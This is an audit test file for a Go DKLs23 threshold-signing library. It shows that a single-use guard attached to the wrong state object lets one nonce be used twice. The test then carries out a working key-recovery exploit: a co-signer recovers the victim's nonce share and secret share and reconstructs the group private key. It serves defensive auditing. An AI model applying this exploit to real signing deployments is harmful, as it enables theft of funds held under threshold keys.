package dkls23

import (
	"crypto/rand"
	"crypto/sha256"
	"testing"

	"github.com/btcsuite/btcd/btcec/v2"
	"github.com/stretchr/testify/require"
)

// TestAuditRound1StateNotSingleUse shows that the round-3 single-shot guard is
// attached to the wrong object. round3Done lives on Round2State, but the
// secrets that must never be used twice (r_i, phi_i, and the VOLE Bob chi) live
// on Round1State. Calling SignRound2 twice on one Round1State mints two
// Round2States, each with its own fresh round3Done=false, so round 3 runs twice
// over one nonce and the exact break the code documents goes through.
func TestAuditRound1StateNotSingleUse(t *testing.T) {
	setups := setupSigners(t, []int{1, 2}, 2)
	signers := []int{1, 2}
	sigID := "audit-r1-reuse"
	message := []byte("pay attacker 100 BTC")
	msgHash := sha256.Sum256(message)

	// Victim = party 1. Attacker = party 2 (a normal signer; it never has to
	// deviate from the crypto, only to send two different round-1 commitments).
	st1, m1From1, err := SignRound1(setups[1], sigID, signers)
	require.NoError(t, err)
	st2, m1From2, err := SignRound1(setups[2], sigID, signers)
	require.NoError(t, err)

	// Attacker's honest opening pair, and a second one it also commits to.
	psiA := st2.Psi[1]
	comA := m1From2[1].Commitment

	var saltB [SaltLen]byte
	_, err = rand.Read(saltB[:])
	require.NoError(t, err)
	var psiScalarA, delta, psiScalarB btcec.ModNScalar
	psiScalarA.SetByteSlice(psiA[:])
	delta.SetInt(7)
	psiScalarB.Add2(&psiScalarA, &delta)
	psiB := psiScalarB.Bytes()
	comB := commitWithSalt(commitMsgForPeer(st2.R_iPoint, psiB[:]), saltB)

	corr := m1From2[1].OTECorrections

	// --- Two SignRound2 calls against the SAME Round1State. Nothing rejects it.
	r2A, _, err := SignRound2(setups[1], st1, map[int]*Round1Msg{
		2: {Commitment: comA, OTECorrections: corr},
	})
	require.NoError(t, err)
	r2B, _, err := SignRound2(setups[1], st1, map[int]*Round1Msg{
		2: {Commitment: comB, OTECorrections: corr},
	})
	require.NoError(t, err, "SignRound2 is not single-use w.r.t. Round1State")

	// Attacker's genuine round-2 message to the victim.
	_, m2From2, err := SignRound2(setups[2], st2, map[int]*Round1Msg{1: m1From1[2]})
	require.NoError(t, err)
	msgA := *m2From2[1]
	msgB := msgA
	msgB.Salt = saltB
	msgB.Psi = psiB[:]

	// --- Both round 3s succeed: every check passes, both openings are valid.
	fragsA, err := SignRound3(setups[1], r2A, message, map[int]*Round2Msg{2: &msgA})
	require.NoError(t, err)
	fragsB, err := SignRound3(setups[1], r2B, message, map[int]*Round2Msg{2: &msgB})
	require.NoError(t, err, "second round 3 over the same nonce accepted")

	// --- Attacker's arithmetic: two fragments, one nonce, two known psi.
	var uA, uB, wA, wB btcec.ModNScalar
	uA.SetByteSlice(fragsA[1].U_i)
	uB.SetByteSlice(fragsB[1].U_i)
	wA.SetByteSlice(fragsA[1].W_i)
	wB.SetByteSlice(fragsB[1].W_i)

	var negB, dU, dW, dPsi btcec.ModNScalar
	negB.NegateVal(&uB)
	dU.Add2(&uA, &negB)
	negB.NegateVal(&wB)
	dW.Add2(&wA, &negB)
	negB.NegateVal(&psiScalarB)
	dPsi.Add2(&psiScalarA, &negB)
	dPsiInv := scalarInverse(&dPsi)

	var gotR btcec.ModNScalar
	gotR.Mul2(&dU, &dPsiInv) // (u - u')/(psi - psi') = r_1
	require.True(t, gotR.Equals(&st1.R_i), "victim's nonce share r_1 recovered")

	// (w - w')/(psi - psi') = rx * sk_1
	rx := computeRxFromStates(signers, map[int]*Round2State{1: r2A, 2: {Round1State: st2}})
	rxInv := scalarInverse(&rx)
	var gotSK btcec.ModNScalar
	gotSK.Mul2(&dW, &dPsiInv)
	gotSK.Mul(&rxInv)
	require.True(t, gotSK.Equals(&r2A.SK_i), "victim's rerandomized share sk_1 recovered")

	// sk_1 + sk_2 is the group private key.
	r2Two, _, err := SignRound2(setups[2], st2, map[int]*Round1Msg{1: m1From1[2]})
	require.NoError(t, err)
	var full btcec.ModNScalar
	full.Add2(&gotSK, &r2Two.SK_i)
	pk, err := scalarMulGCompressed(&full)
	require.NoError(t, err)
	require.Equal(t, setups[1].PubKey, pk, "recovered the group private key")
	_ = msgHash
	t.Log("recovered r_1, sk_1 and the full group private key from one nonce")
}
